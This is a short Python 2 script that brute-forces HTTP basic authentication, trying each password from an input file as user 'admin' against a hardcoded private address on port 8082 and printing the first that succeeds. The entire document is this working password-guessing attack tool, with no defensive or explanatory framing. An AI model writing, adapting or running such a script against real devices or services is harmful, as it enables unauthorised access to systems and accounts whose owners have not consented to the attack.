#!/usr/bin/python2.6
import sys, urllib2, fileinput
User='admin'
Target='192.168.1.100'
Port='8082'
File=fileinput.input()
output = 'ALL FAILED'
for i in File:
   url = 'http://'+User+':'+i+'@'+Target+':'+Port
   try:
      if urllib2.urlopen(url):
	 output = User+' :: '+i
	 break
   except urllib2.URLError:
      continue

print(output)